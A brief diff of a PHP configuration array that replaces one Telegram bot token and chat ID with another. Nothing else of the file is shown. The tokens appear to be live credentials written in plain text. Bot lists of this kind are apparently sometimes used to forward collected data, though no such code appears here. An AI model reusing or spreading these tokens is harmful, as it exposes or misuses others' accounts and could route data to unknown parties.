@@ -16,8 +16,8 @@ $telegram_bots = [
         'chat_id' => '1325797388'
     ],
     [
-        'token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44',
-        'chat_id' => '7510889526'
+        'token' => '8187021949:AAED4PdfxR4o4oRJjLMht3UnBDp52FFG8Ok',
+        'chat_id' => '5768557636'
     ]
     // Add more bots here if needed
 ];
